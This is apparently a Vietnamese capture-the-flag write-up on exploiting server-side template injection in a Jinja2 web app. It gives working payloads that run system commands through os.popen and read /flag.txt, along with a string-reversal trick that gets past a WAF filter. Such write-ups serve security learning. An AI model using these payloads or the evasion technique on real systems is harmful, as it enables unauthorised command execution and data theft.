## 🔍 **Khai thác SSTI + Bypass WAF (Reverse String Technique)**

<p>
Thử <code>{{7*7}}</code> xem web có bị lỗ hổng <b>SSTI</b> không:
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/52d7d27e-a45c-4d9c-b2ae-f15720c470c1" width="600"/>
</p>

<p>
➡️ Kết quả trả về <b>49</b> → xác nhận web <b>dính lỗ hổng SSTI</b>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/a89741d1-eed2-46f8-a1ad-9365b3956dcf" width="600"/>
</p>

<p>
Sử dụng payload sau để kiểm tra WAF:
</p>

<pre>
{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x67\x65\x74')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x67\x65\x74')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('ls -la')|attr('\x72\x65\x61\x64')() }}
</pre>

<p>
➡️ Bộ lọc <b>khá khó chịu</b>, payload bị chặn
</p>

<p>
Tiếp đó bypass bằng cách đảo chuỗi (<code>[::-1]</code>):
</p>

<pre>
{{ lipsum|attr('__slabolg__'[::-1])|attr('teg'[::-1])('__snitliub__'[::-1])|attr('teg'[::-1])('__tropmi__'[::-1])('so'[::-1])|attr('nepop'[::-1])('ls -la')|attr('daer'[::-1])() }}
</pre>

<p align="center">
  <img src="https://github.com/user-attachments/assets/a656babe-a95a-45f5-9466-a21425878e2c" width="600"/>
</p>

<p>
➡️ <b>Bypass thành công</b> và thực thi được lệnh hệ thống
</p>

<p>
Đọc file flag:
</p>

<pre>
{{ lipsum|attr('__slabolg__'[::-1])|attr('teg'[::-1])('__snitliub__'[::-1])|attr('teg'[::-1])('nepo'[::-1])('/flag.txt')|attr('daer'[::-1])() }}
</pre>

<p align="center">
  <img src="https://github.com/user-attachments/assets/73c87a2f-5f04-4d4c-b6e1-b3f5f3140217" width="600"/>
</p>

<p>
➡️ Thu được flag:
</p>

<pre>
kashiCTF{LPY0oeo2GHmm1E2EYUsPeC1XW844C1FT}
</pre>
